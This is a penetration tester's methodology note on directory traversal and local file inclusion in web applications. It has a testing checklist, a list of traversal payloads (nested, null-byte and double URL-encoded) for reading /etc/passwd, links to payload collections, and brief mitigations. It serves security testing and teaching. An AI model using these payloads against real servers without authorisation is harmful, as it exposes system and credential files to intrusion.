---
title: "Directory Traversal"
layout: notes
tags:
  - webapp
  - methodology
  - directory-traversal
  - FI_api
  - FI_user-input
  - FI_file-upload
  - FI_image-upload
  - FI_parameters
  - FI_urls
  - Co_lfi
---
## Summary

Whenever an endpoint references a file with a parameter it is possible to inject path traversal to redirect to a different file. This can be from POSTed data in a request or a parameter from a GET request with a supplied parameter in the url. Finding ways to bypass filtering and achieve path traversal can lead to LFI and file uploading. 

## Methodology

When trying to achieve path traversal for files ask/try the following:
- [ ] **Are there any parameters which could be related to files?**
	- [ ] **Is there any indication what system this functionality exists on?**
		- [ ] remember to read files that are system relevant
		- [ ] an IIS web server won't have `/etc/passwd` and will use `..\`
- [ ] **Is this RESTful API?**
- [ ] look where images are processed
- [ ] try entering a URL with a file and observe behavior
- [ ] check the filter for special characters
	- [ ] try a basic traversal of `?file=../1.jpg` to induce an error
		- [ ] if returns original file try some more variants, if not continue
- [ ] try classic `../../etc/passwd`
	- [ ] try `..;` for Java apps
	- [ ] if nothing try replacing with `..\` for Windows
	- [ ] if no results attempt absolute reference `/etc/passwd`
	- [ ] if no results try nested `..././..././etc/passwd`
	- [ ] if no results try urlencoded
	- [ ] if no results try urlencoded x2
	- [ ] if no results try null byte negating extension
	- [ ] if no results try using an absolute accepted path then path traversal out 
		- [ ] `/var/www/images/../../../etc/passwd`
- [ ] once determined what restrictions exist on file reading enumerate to determine impact

## Capabilities

LFI

## Found In

APIs  
User Input  
File Upload  
Image Upload  
Parameters  
URLs  

## Tools/Examples

LFI
```
../../../../../etc/passwd
/etc/passwd
....//....//....//....//etc/passwd
..././..././..././..././etc/passwd
../../../../etc/passwd%00.jpg
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
/var/www/images/../../../etc/passwd
```

[https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#lfi2rce](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#lfi2rce)
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

#### Mitigation

Restricting user input to API calls resulting in file system access  
Set a web root directory to prevent allowing higher level directories  
Sanitize (recursively) user input for unwanted characters  
Use a whitelist to define what is allowed  
